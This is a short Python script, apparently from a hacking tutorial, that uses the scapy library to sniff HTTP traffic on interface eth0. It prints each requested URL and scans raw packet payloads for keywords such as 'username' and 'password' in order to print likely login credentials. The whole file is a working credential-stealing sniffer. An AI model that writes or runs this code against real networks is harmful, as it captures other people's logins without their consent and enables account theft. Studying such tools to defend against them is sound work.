import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)       #iface is the interface on which we want to listen; store is disable so that all the logs do not get stored and prn is a function that is want to be executed when sniff function get executed; filter is used to filter out only the data that we want to capture

def get_url(packet):
    url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    return url

def get_login_details(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "uname", "password", "pass", "login", "pword"]
        for key in keywords:
            if key in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):           #check whether the http.HTTPRequest layer is present
        url=get_url(packet)
        print "[+] HTTP Request >> " + url + "\n\n"

        login_details=get_login_details(packet)
        if login_details:
            print "Possible Login Credentials: " + login_details + "\n\n"
sniff("eth0")